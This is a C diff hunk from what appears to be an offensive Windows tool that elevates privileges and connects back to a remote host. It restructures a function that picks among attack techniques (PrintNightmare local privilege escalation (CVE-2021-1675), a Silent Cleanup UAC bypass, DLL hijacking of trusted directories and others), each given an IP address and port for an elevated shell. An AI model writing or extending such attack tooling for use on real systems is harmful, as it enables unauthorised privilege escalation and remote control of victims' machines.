@@ -99,38 +99,35 @@ BOOL ExploitOpenShell(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPA
 
 BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
     BOOL returnValue = FALSE;
+    if (UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
+        printMsg(STATUS_OK, LEVEL_DEFAULT, "Local Privilege Escalation: 'PrintNightmare - (CVE-2021-1675)'\n");
+        returnValue = ExploitPrintNightmareLPE(PathExeToRun, ipAddress, port, wincatDefaultDir);
+    } else{
+        if (!IsUACEnabled()){
+            printMsg(STATUS_WARNING, LEVEL_DEFAULT, "UAC is disabled.\n");
+            if (!SaveRHostInfo(ipAddress, port)){
+                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST information");
+                return FALSE;
+            }
+            return RunAs(PathExeToRun, NULL);
+        } else{
+            UAC_POLICY uacPolicy = CheckUACSettings();
+            if (uacPolicy == UAC_POLICY_DEFAULT || uacPolicy == UAC_POLICY_DISABLE){
 
-    if (!IsUACEnabled()) {
-        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "UAC is disabled.\n");
-        if (!SaveRHostInfo(ipAddress, port)) {
-            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST information");
-            return FALSE;
-        }
-        return RunAs(PathExeToRun, NULL);
-    } else {
-        UAC_POLICY uacPolicy = CheckUACSettings();
-        if (uacPolicy == UAC_POLICY_DEFAULT || uacPolicy == UAC_POLICY_DISABLE) {
+                if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN){
+                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
+                    returnValue = ExploitSilentCleanup(PathExeToRun, ipAddress, port);
 
-            if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN) {
+                } else if (UacBypassTec == UAC_BYPASS_COMP_TRUSTED_DIR){
 
-                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
-                returnValue = ExploitSilentCleanup(PathExeToRun, ipAddress, port);
+                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
+                    returnValue = ExploitTrustedDirectories(PathExeToRun, ipAddress, port);
+                } else{
 
-            } else if(UacBypassTec == UAC_BYPASS_COMP_TRUSTED_DIR) {
+                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
+                    returnValue = ExploitOpenShell(PathExeToRun, ipAddress, port, UacBypassTec);
 
-                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
-                returnValue = ExploitTrustedDirectories(PathExeToRun, ipAddress, port);
-
-
-            } else if (UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
-                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'PrintNightmare LPE - (CVE-2021-1675)'\n");
-                returnValue = ExploitPrintNightmareLPE(PathExeToRun, ipAddress, port, wincatDefaultDir);
-
-            } else {
-
-                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
-                returnValue = ExploitOpenShell(PathExeToRun, ipAddress, port, UacBypassTec);
-
+                }
             }
         }
     }
